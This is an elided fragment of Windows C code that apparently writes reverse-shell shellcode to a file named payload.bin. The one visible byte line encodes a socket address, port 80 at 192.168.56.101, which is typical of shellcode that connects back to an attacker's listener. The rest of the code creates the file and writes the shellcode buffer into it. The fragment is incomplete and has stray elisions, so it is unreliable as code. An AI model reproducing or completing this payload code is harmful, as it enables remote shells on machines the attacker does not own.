...
int main(void) {
    ...
    unsigned char shellcode[] =
        ...
        "\x89\xe5\x49\xbc\x02\x00\x00\x50\xc0\xa8\x38\x65\x41\x54"
    ...
    */
    ...
    HANDLE hFile = CreateFileW(L"payload.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) {
        printf("Failed creating the payload.bin file-> %d\n", GetLastError());
    }
    printf("\n\nCreated payload.bin\n");

    DWORD bytesWritten = 0;
    WriteFile(hFile, scaddr, shellcodeSize, &bytesWritten, NULL);
